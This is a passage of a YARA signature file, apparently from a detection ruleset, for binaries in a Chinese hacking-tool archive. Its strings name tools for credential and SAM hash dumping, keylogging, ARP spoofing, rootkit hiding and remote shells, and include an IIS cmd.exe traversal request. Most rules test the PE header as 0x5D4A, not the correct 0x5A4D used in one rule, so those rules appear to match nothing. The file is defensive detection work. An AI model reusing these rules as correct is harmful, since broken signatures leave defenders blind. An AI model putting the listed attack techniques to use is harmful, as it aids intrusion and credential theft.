		description = "Chinese Hacktool Archive - file XScanLib.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4b3b112975bc49e62adbb2aaf5363f6ccb9996b3"
	strings:
		$s0 = "Services/%s" fullword ascii
		$s5 = "XScanLib.dll" fullword ascii
		$s12 = "Ports/%s/%d" fullword ascii
		$s18 = "DEFAULT-UDP-PORT" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_http_2 {
	meta:
		description = "Chinese Hacktool Archive - file http.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "199e566fb78db356744e0da20dc8e8da93540941"
	strings:
		$s0 = "http.exe" fullword ascii
	condition:
		uint16(0) == 0x5A4D and $s0 and filesize < 35000
}

rule CN_Hacktools_LSASSDLL {
	meta:
		description = "Chinese Hacktool Archive - file LSASSDLL.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "02f150b7a5c505175b13b2f506094641d34b5803"
	strings:
		$s2 = "sbaaNetapi.dll" fullword ascii
		$s5 = "LSASSDLL Dynamic Link Library" fullword wide
		$s7 = "TKLSASSScan" fullword ascii
		$s9 = "LSASSDLL DLL" fullword wide
		$s10 = "4NTLMSSP" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_klogger {
	meta:
		description = "Chinese Hacktool Archive - file klogger.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "cd49eb066f35ab19f2a1b6fd0f7cf500fb0602d4"
	strings:
		$s0 = "klogger 1.0" fullword ascii
		$s1 = "arne.vidstrom@ntsecurity.nu" fullword ascii
		$s2 = "klogger.txt" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_wget {
	meta:
		description = "Chinese Hacktool Archive - file wget.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "769fc79a6972a223456cc6da45bdd24ef39f51d8"
	strings:
		$s5 = "<<ERROR>>O" fullword ascii
		$s7 = "PENDING1_SETUP_KEY_BL" ascii
		$s2 = "KMsi.NDTODLT" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of ($s*) and filesize < 300000
}

rule CN_Hacktools_meterpreter_metsrv {
	meta:
		description = "Chinese Hacktool Archive - file metsrv.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "254fa29852d8ab4d48033531d40b9e2fab3b21bc"
	strings:
		$s5 = "[ -= meterpreter server =- ]" fullword ascii
		$s13 = "metsrv.dll" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_SockServerCfg {
	meta:
		description = "Chinese Hacktool Archive - file SockServerCfg.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4475919bbd91e39d25545e0e1ab81fbe7e76a34c"
	strings:
		$s4 = "'SockServer.EXE'" fullword ascii
		$s5 = "All Rights Reserved, (C) 2001,2002 by LaiHongChang" fullword wide
		$s6 = "Simple TCP Service0Simple TCP Service of SOCK proxy by snake. v1.05" fullword wide
		$s8 = "The Sk_Service not install, all param cannot be save." fullword ascii
		$s9 = "There is still not install [SkServer] Service, Please install at first.!!!" fullword ascii
		$s10 = "val AppID = s {2A4882D2-E27D-4E3B-8A0E-5E72E3F80689}" fullword ascii
		$s11 = "{2A4882D2-E27D-4E3B-8A0E-5E72E3F80689} = s 'SockServer'" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_enc_null {
	meta:
		description = "Chinese Hacktool Archive - file enc_null.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9c80730f585d9c67fef004953cdb55503b8794a9"
	strings:
		$s0 = "enc_null.dll" fullword ascii
		$s1 = "BO2K Wussy NULL Encryption Module" fullword ascii
		$s2 = "NULLENC: BO2K NULL Encryption" fullword ascii
		$s4 = "<**CFG**>NULL" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_NetFuke_Modify_2 {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Modify.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "611ab5c2cf4e95b77199d44d22e8fe06c61629f7"
	strings:
		$s0 = "powered by shadow" fullword ascii
		$s1 = "Copyright (c) by shadow Stdio Lib" fullword ascii
		$s2 = "NetFuke_Modify.dll" fullword ascii
		$s4 = "b_OcxCommand" fullword ascii
		$s7 = "Replace = [*] //" fullword ascii
		$s11 = "DestPort = *" fullword ascii
		$s19 = "FromIP = " fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_wssport_wssPort {
	meta:
		description = "Chinese Hacktool Archive - file wssPort.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a6e72afdb2ebb9613d6d3a3948e1e5da0b6a037f"
	strings:
		$s1 = "wssPort v1.0 for Windows 2k,  TCP/IP Process to Port Mapper" fullword ascii
		$s2 = "http://www.netguard.com.cn  http://www.whitecell.org" fullword ascii
		$s3 = "Load ntdll.dll or psapi.dll failure!" fullword ascii
		$s6 = "Process ID:%4d Process Name:%15s Open Port:%4d   TCP" fullword ascii
		$s7 = "Write by ilsy , Netguard Security Team" fullword ascii
		$s9 = "Open device tcp or udp  error!" fullword ascii
		$s10 = "You must have administrator privileges to run iPort - exiting..." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_Packet2K_Packet {
	meta:
		description = "Chinese Hacktool Archive - file Packet.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3b4f39ac9f6049143123c9fa85c4346fef18b5e8"
	strings:
		$s0 = "\\\\.\\%s%s" fullword wide
		$s1 = "PacketResetAdapter" fullword ascii
		$s2 = "PacketWaitPacket" fullword ascii
		$s4 = "Packet_" fullword wide
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_Release_hide1 {
	meta:
		description = "Chinese Hacktool Archive - file hide1.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "15f711ef0ed19f41ac8d61cb77892039895aa2cb"
	strings:
		$s0 = "hide.exe 1 pid #Hide the windows" fullword ascii
		$s1 = "hide.exe 2 pid #Show the windows" fullword ascii
		$s2 = "Hide the windows by Pid" fullword ascii
		$s3 = "Write by Alpha[S.F.T]" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_cryptcat {
	meta:
		description = "Chinese Hacktool Archive - file cryptcat.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "305c6be2c98b7e22e1ce6201cfa9ec13cb7a1218"
	strings:
		$s5 = "nc -l -p port [options] [hostname] [port]" fullword ascii
		$s10 = "Failed to execute shell, error = %s" fullword ascii
		$s11 = "gethostpoop fuxored" fullword ascii
		$s17 = "loadports: bogus values %d, %d" fullword ascii
		$s18 = "Warning: source routing unavailable on this machine, ignoring" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_bin2txt {
	meta:
		description = "Chinese Hacktool Archive - file bin2txt.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "12a86ff34bc0688c5e455a219badf349f77e0d24"
	strings:
		$s3 = "mailto:titilima@163.com" fullword ascii
		$s4 = "http://titilima.nease.net" fullword ascii
		$s6 = "<description>bin2txt</description>" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_UNICODEDLL {
	meta:
		description = "Chinese Hacktool Archive - file UNICODEDLL.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "47b2b1764cfffdb77a5b937a632fbea527419141"
	strings:
		$s0 = "GET /%s/%s/winnt/system32/cmd.exe?/c%sdir HTTP/1.0" fullword ascii
		$s3 = "UNICODEDLL" fullword wide
		$s9 = "\"%20RUNAT%3d\"Server\"^>%20^</SCRIPT^>" fullword ascii
		$s11 = "^<SCRIPT%20LANGUAGE%3d\"" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_CPD {
	meta:
		description = "Chinese Hacktool Archive - file CPD.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "addf99ba9b4429db16548c1631f27130dd98edd7"
	strings:
		$s0 = "http://www.n-ku.com/blog/blog.asp?name=bigboyq" fullword ascii
		$s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0; .NET CLR 1.1.4322" ascii
		$s4 = "[+] Finish: [%d%%] C Avg.Speed: [%d] C/S Now: [%d] C/S" fullword ascii
		$s10 = "[+] [-f <ProxyFile>] Load Proxy From File DEFAULT:%s" fullword ascii
		$s11 = "[-] Thread [%d] must Between [1-1900]" fullword ascii
		$s12 = "[+] [-d <Delay>] Set Time to Delay DEFAULT:%d" fullword ascii
		$s13 = "[+] EASYUSAGE:%s <-h HTTPURL>" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_JiurlPortHide {
	meta:
		description = "Chinese Hacktool Archive - file JiurlPortHide.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c7562e1eeefa46258b87e5ee6dd251cfabbc0509"
	strings:
		$s0 = "JiurlPortHide: Hello,This is DriverEntry!" fullword ascii
		$s2 = "jiurl@mail.china.com" fullword wide
		$s3 = "JiurlPortHide.sys" fullword wide
		$s5 = "JiurlPortHide: HidePort %d" fullword ascii
		$s7 = "JiurlPortHide: Bye,This is DriverUnload!" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_arpspoof_2 {
	meta:
		description = "Chinese Hacktool Archive - file arpspoof.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "825a58e4951440bfdc500b5c485e297b93e62ab7"
	strings:
		$s7 = "ArpSpoof 1.0 By CoolDiyer, Auto Router In Switch" fullword ascii
		$s13 = "ArpSpoof /l" fullword ascii
		$s14 = "arp -s %s %.2x-%.2x-%.2x-%.2x-%.2x-%.2x" fullword ascii
		$s16 = "ArpSpoof <IP1> <IP2> <NetAdp> <Mode> [/RESET]" fullword ascii
		$s17 = "SendARP Error:%d" fullword ascii
	condition:
		uint16(0) == 0x5D4A and 1 of them
}

rule CN_Hacktools_TinyFTPD {
	meta:
		description = "Chinese Hacktool Archive - file TinyFTPD.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "210c00db9f9f164faf73ceaf941b0bf2a00c82c8"
	strings:
		$s5 = ".rdataXv" fullword ascii
		$s6 = "ssword Is Acceptable" fullword ascii
		$s12 = "Time Out$Detec" fullword ascii
	condition:
		all of them and filesize < 18000
}

rule CN_Hacktools_bin_Client_2 {
	meta:
		description = "Chinese Hacktool Archive - file Client.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "3478ccd4fae8d5c23c479690e573d269b1923b6d"
	strings:
		$s0 = "by G-leiz [gleizx_at_hotmail.com]" fullword ascii
		$s1 = "input source port(whatever you want):" fullword ascii
		$s2 = "Recieved respond from server!!" fullword ascii
		$s4 = "system is busy!! halted!" fullword ascii
		$s5 = "packet door client" fullword ascii
	condition:
		uint16(0) == 0x5D4A and 3 of them
}

rule CN_Hacktools_tools_CCv2b {
	meta:
		description = "Chinese Hacktool Archive - file CCv2b.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6be71f9925306bd6719c5ff903b4cb426d56b862"
	strings:
		$s0 = "test.EXE" fullword wide
		$s2 = "test Microsoft " fullword wide
		$s7 = "MSVCRT" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_bin_T_Cmd {
	meta:
		description = "Chinese Hacktool Archive - file T-Cmd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "62a1ca65c7d32139c48e64201f449cf3af26d244"
	strings:
		$s0 = "#NULLk\\\\%s" fullword ascii
		$s2 = "GetLa2A" fullword ascii
		$s3 = "Kablto iniValiz" fullword ascii
		$s8 = "pur+virtu!3" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_srv_regfile {
	meta:
		description = "Chinese Hacktool Archive - file srv_regfile.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "312a0162b59b4354ecfe9dbb8732b597d9306e73"
	strings:
		$s0 = "Could not set value. MULTI_SZ only supported by Windows NT." fullword ascii
		$s14 = "BO2K Registry & File Commands" fullword ascii
		$s17 = "Target Pathname" fullword ascii
		$s18 = "%d matches found." fullword ascii
		$s20 = "Could not open key. Invalid root key." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_vbox_unvbox {
	meta:
		description = "Chinese Hacktool Archive - file unvbox.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8ce9cdaf834cf0db180e13333fd33cb22b70865a"
	strings:
		$s0 = "unvbox.dll" fullword ascii
		$s1 = "kernel.dll" fullword ascii
		$s2 = "!Hydra Plugin" fullword ascii
		$s3 = "IsBadPtr" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ext_server_sam {
	meta:
		description = "Chinese Hacktool Archive - file ext_server_sam.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7ac5000014dca0569470327b2e3f8080e06d8774"
	strings:
		$s0 = "Error getting lsass.exe handle." fullword ascii
		$s4 = "Timed out waiting for the data to be collected." fullword ascii
		$s5 = "ext_server_sam.dll" fullword ascii
		$s8 = "metsrv.dll" fullword ascii
		$s9 = "sam_gethashes" fullword ascii
		$s10 = "DeinitServerExtension" fullword ascii
		$s20 = "packet_transmit" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_srv_scanpw {
	meta:
		description = "Chinese Hacktool Archive - file srv_scanpw.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "14db681bb2b4b62f15a5c4e1fb3dcd87029d9bd1"
	strings:
		$s0 = "S[30]:PW File=C:\\testlog.txt" fullword ascii
		$s3 = "Successfully started Password Logging" fullword ascii
		$s6 = "Could not start Password Logging" fullword ascii
		$s7 = "[%s] %s (Possible Usernames: %s)" fullword ascii
		$s8 = "<**CFG**>Password Scanning" fullword ascii
		$s9 = "scan_pw.dll" fullword ascii
		$s10 = "srv_scanpw.dll" fullword ascii
		$s11 = "Start Log" fullword ascii
		$s15 = "N[1,60000]:Delay=500" fullword ascii
		$s16 = "PW Scanning" fullword ascii
		$s17 = "View PW File" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_xport {
	meta:
		description = "Chinese Hacktool Archive - file xport.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9584de562e7f8185f721e94ee3cceac60db26dda"
	strings:
		$s3 = "Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)" fullword ascii
		$s4 = "Example: xport www.xxx.com 80 -m syn" fullword ascii
		$s8 = "Usage: xport <Host> <Ports Scope> [Options]" fullword ascii
		$s9 = ".\\port.ini" fullword ascii
		$s10 = "Code by glacier <glacier@xfocus.org>" fullword ascii
		$s15 = "-t <count>: specify threads count, default is %d" fullword ascii
		$s16 = "Port scan complete, total %d port, %d port is opened, use %d ms." fullword ascii
		$s17 = "http://www.xfocus.org" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_gdiscan {
	meta:
		description = "Chinese Hacktool Archive - file gdiscan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "5e4d0c7de2d68f0ad995749b4d1c0caf9f385336"
	strings:
		$s0 = "LaBrea Technologies, Inc." fullword wide
		$s10 = "GDICLScan" fullword wide
		$s16 = "app_type" fullword ascii
		$s17 = "Next1A" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_T_PsKit {
	meta:
		description = "Chinese Hacktool Archive - file T-PsKit.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "94f7187e912fba9e5d5359c68eca50b4e569a1b5"
	strings:
		$s0 = "time error" fullword ascii
		$s8 = "UsrSecuritySyst" ascii
		$s13 = "- Kablto ini" fullword ascii
		$s20 = "AMDISK" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_SchedExec_2 {
	meta:
		description = "Chinese Hacktool Archive - file SchedExec.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "22faee733f4e4515d904ef35f1e31dc24d7847bb"
	strings:
		$s0 = "Executeable Files (*.exe)|*.exe|All Files (*.*)|*.*||" fullword wide
		$s1 = " (C) 2003-9-25 Inetufo http://www.fz5fz.org" fullword wide
		$s2 = "SchedExec.exe" fullword wide
		$s3 = "http://www.fz5fz.org" fullword wide
		$s4 = "mailto:Inetufo@fz5fz.org" fullword ascii
		$s5 = "Admin$\\system32\\" fullword wide
		$s6 = "Unable to open hyperlink:" fullword ascii
		$s7 = "SchedExec Microsoft " fullword wide
	condition:
		uint16(0) == 0x5D4A and 3 of them
}

rule CN_Hacktools_MS0670DLL {
	meta:
		description = "Chinese Hacktool Archive - file MS0670DLL.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "196235a620da100b7647412215943998acc630f8"
	strings:
		$s2 = "\\\\172.22.5.46\\IPC" wide
		$s7 = "TKMs0670Exploit" fullword ascii
		$s12 = "MS0670DLL" fullword wide
		$s15 = "\\wkssvc" fullword wide
	condition:
		uint16(0) == 0x5D4A and 2 of them
}

rule CN_Hacktools_tools_LH {
	meta:
		description = "Chinese Hacktool Archive - file LH.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0154058aeca1a492fb810488ef3b88b815e6717a"
	strings:
		$s0 = "Copyright (C) Nu-Mega Technologies, All rights reserved" fullword ascii
		$s1 = "Command Shell" fullword ascii
		$s12 = "$Usage: LH file-name" fullword ascii
		$s14 = "Start           Size     Usage" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_bin_msi216 {
	meta:
		description = "Chinese Hacktool Archive - file msi216.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ec6df013d6baab8fa25739749943441fb5163889"
	strings:
		$s0 = "dYtc.exe" fullword ascii
		$s7 = "to iniValiz" fullword ascii
		$s10 = "$Id: UPX 1.01 Copyright (C) 1996-2000 the UPX Team. All Rights Reserved." fullword ascii
		$s11 = "BoHand" fullword ascii
		$s18 = "FileASetTNPril" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_RAEdit {
	meta:
		description = "Chinese Hacktool Archive - file RAEdit.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "690800afeb3e83c341e3611df9e4a84d11f23a82"
	strings:
		$s0 = "Memory allocation failed! (Char)" fullword ascii
		$s4 = "RAEdit.dll" fullword wide
		$s7 = "Code edit control" fullword wide
		$s10 = "RAEDITCHILD" fullword ascii
		$s11 = "RAEdit control" fullword ascii
		$s17 = "RAEdit" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_hydra_4_6_win_hydra {
	meta:
		description = "Chinese Hacktool Archive - file hydra.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6932768a2815d7452b2b55dc8f9f0f6f82810e6c"
	strings:
		$s3 = "Hydra - THC password cracker - visit http://www.thc.org" ascii
		$s11 = "You must supply the initial password to logon via the -m option" fullword ascii
		$s15 = "HEAD http://%s:%d%.250s HTTP/1.0" fullword ascii
		$s20 = "Error: child %d send nonsense data, killing and restarting it!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_zxftpd {
	meta:
		description = "Chinese Hacktool Archive - file zxftpd.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7def4258968d12611ac9cf30f4ab6aef69ed3508"
	strings:
		$s0 = "name=\"Microsoft.Windows.Test\"" fullword ascii
		$s1 = "<description>Your app description here</description> " fullword ascii
		$s3 = "FSG!" fullword ascii
		$s4 = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDL" fullword ascii
	condition:
		all of them and filesize > 20000 and filesize < 35000
}

rule CN_Hacktools_NetFuke_Analyse_2 {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Analyse.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ff9df4f87e2eb837c616f1264fa2ca3e771118b7"
	strings:
		$s0 = "powered by shadow" fullword ascii
		$s1 = "NetFuke_Analyse.dll" fullword ascii
		$s4 = "FTPPort = 21" fullword ascii
		$s20 = "EnablePOP = FALSE" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_fcp {
	meta:
		description = "Chinese Hacktool Archive - file fcp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7eec841c5f078ddf5b61f777189b5b3e8a6d9235"
	strings:
		$s1 = "Borland\\Delphi\\RTL" fullword ascii
		$s3 = "program must be run " fullword ascii
		$s4 = "File Crypterro by Ap" fullword ascii
		$s8 = "[ DONE!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ASM2Shellcode_A2S {
	meta:
		description = "Chinese Hacktool Archive - file A2S.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "b1aef1090db4da72cdcb3b7ce4c6d2bc2550047a"
	strings:
		$s3 = "codelib.dll" fullword ascii
		$s5 = "FTWARE\\Borland\\Delphi\\RTL" fullword ascii
		$s14 = "Quality!" fullword ascii
		$s16 = "OTarget" fullword ascii
		$s17 = "MAINICO" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_creddump_2 {
	meta:
		description = "Chinese Hacktool Archive - file creddump.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6fa0a8e7a3a44ec120ad8d28139c0d6a9b119f53"
	strings:
		$s0 = "creddump.dll" fullword ascii
		$s4 = "DumpCF" fullword ascii
		$s19 = "JRich7" fullword ascii
	condition:
		uint16(0) == 0x5D4A and all of them
}

rule CN_Hacktools_aircrack {
	meta:
		description = "Chinese Hacktool Archive - file aircrack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "d053383fc378944a1902d99775ab8b5fd0ed9841"
	strings:
		$s0 = "aircrack %d.%d - (C) 2004,2005 Christophe Devine" fullword ascii
		$s2 = "-d <start> : debug - specify beginning of the key" fullword ascii
		$s3 = "-p <nbcpu> : SMP support: # of processes to start" fullword ascii
		$s4 = "usage: aircrack [options] <.cap / .ivs file(s)>" fullword ascii
		$s6 = "(-f) or try the standard attack mode instead (no -y option)." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_bin_klister {
	meta:
		description = "Chinese Hacktool Archive - file klister.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "caca95eeb681536c8b436bcf64e10d2b001c5e6a"
	strings:
		$s2 = "klister %s, Joanna Rutkowska, 2003" fullword ascii
		$s12 = "\\\\.\\klister" fullword wide
		$s13 = "determinig OS version... " fullword ascii
		$s19 = "sending  IOCTL_KLISTER_LISTPROC..." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_FBIchatV1 {
	meta:
		description = "Chinese Hacktool Archive - file FBIchatV1.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "979e299b04de6b83d375677e7b6eaea0418997b2"
	strings:
		$s0 = "\\system32\\msvbvm60.dll\\3VBR" fullword ascii
		$s10 = "FBIchatV1.dll" fullword ascii
		$s20 = "C:\\WINDOWS/" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_gtkAbsinthe {
	meta:
		description = "Chinese Hacktool Archive - file gtkAbsinthe.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "75692bfefa77774885827f34969a1eb5045fb09c"
	strings:
		$s12 = "gtkAbsinthe.exe" fullword wide
		$s20 = "<widget class=\"GtkButton\" id=\"butScan\">" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_winrcLoader {
	meta:
		description = "Chinese Hacktool Archive - file winrcLoader.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "de1e40b016381bbc5d4e96b9cde195f53a99ee0f"
	strings:
		$s4 = "New Password is %s,Please remember!" fullword ascii
		$s7 = "%02d:%02d:%02d Client %s:%d Connect to server!Require id = %06u" fullword ascii
		$s15 = "Fail to set password to %s" fullword ascii
		$s17 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)" fullword ascii
		$s20 = "winrcLoader.exe" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_rcrack {
	meta:
		description = "Chinese Hacktool Archive - file rcrack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "77843a45e5da5a587f6e1cf2a3d309f5937f0bf9"
	strings:
		$s0 = "rcrack rainbow_table_filename -f pwdump_file" fullword ascii
		$s1 = "http://www.antsight.com/zsl/rainbowcrack/" fullword ascii
		$s2 = "by Zhu Shuanglei <shuanglei@hotmail.com>" fullword ascii
		$s8 = "RainbowCrack" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_T_SysCmd_1_0_3 {
	meta:
		description = "Chinese Hacktool Archive - file T-SysCmd-1.0.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "776f4e25db6326eeb9768d9fe728f099625b8bab"
	strings:
		$s0 = "DDK\\T-SysCmd-1.0\\DDK\\i386" fullword ascii
		$s1 = "T-SysCmd-1.0" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_T_ProcMon_2 {
	meta:
		description = "Chinese Hacktool Archive - file T-ProcMon.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e36bf1b16791da0b2c207360d234da191572844b"
	strings:
		$s2 = "Hidden Process Name: %s" fullword ascii
		$s4 = "T-ProcMon.exe" fullword wide
		$s5 = "IoCreateDevice(SymbolicLink) Error !" fullword ascii
		$s6 = "pTempMU == NULL" fullword ascii
		$s7 = "*********** NameOffset == 0x%x ***********" fullword ascii
		$s8 = "T-ProcMon Unload !" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_dhfile_2 {
	meta:
		description = "Chinese Hacktool Archive - file dhfile.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "185764b3651c714b6b270f55b8926a656a522355"
	strings:
		$s4 = "Blog:http://hi.baidu.com/fengze" fullword ascii
		$s7 = "Email:fengze@eviloctal.com" fullword ascii
		$s8 = "Process:%d Handle: %d .... FileName: %s" fullword ascii
		$s12 = "Not found File: %s " fullword ascii
		$s17 = "Close Files Handle....Success" fullword ascii
		$s18 = "DuplicateHandle v1.2" fullword ascii
		$s19 = "(EvilHsu)[E.S.T]" fullword ascii
		$s20 = "...Success!" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_casi_v1_1_shdocvw {
	meta:
		description = "Chinese Hacktool Archive - file shdocvw.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c5efae234cae076b337b46d29d8e7ff133b84c9a"
	strings:
		$s0 = "HKLM, \"%SMIEERS%\",\"Script\",%RES%,\"%25%\\web\\related.htm\"" fullword ascii
		$s14 = "PsvqIEXPLORE.EXE" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_scan500 {
	meta:
		description = "Chinese Hacktool Archive - file scan500.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1a5c5ce86f5579213c23f49d566f26631efd5414"
	strings:
		$s1 = "h=C:\\WINNT\\'" ascii
		$s2 = "onfig.sys*/a" ascii
		$s3 = "cgi-b/GWWEB.EXE" fullword ascii
		$s4 = "GET OM" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_antiyports {
	meta:
		description = "Chinese Hacktool Archive - file antiyports.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
	strings:
		$s0 = "AntiyPorts.EXE" fullword wide
		$s8 = "AntiyPorts" fullword wide
		$s15 = "AntiyPorts MFC Application" fullword wide
		$s16 = "AntiyPorts Application" fullword wide
	condition:
		uint16(0) == 0x5D4A and 2 of them
}

rule CN_Hacktools_tools_cc {
	meta:
		description = "Chinese Hacktool Archive - file cc.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2a6caf6bfaf1c6becb82b4b734293ab413854e53"
	strings:
		$s1 = "This Program is Desined by Fr.Qaker(hiis@163.com)" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows 5.1)" fullword ascii
		$s4 = "xiakexing.com" fullword ascii
		$s8 = "Attack Hosts Saved Successfull!" fullword ascii
		$s9 = "cc.EXE" fullword wide
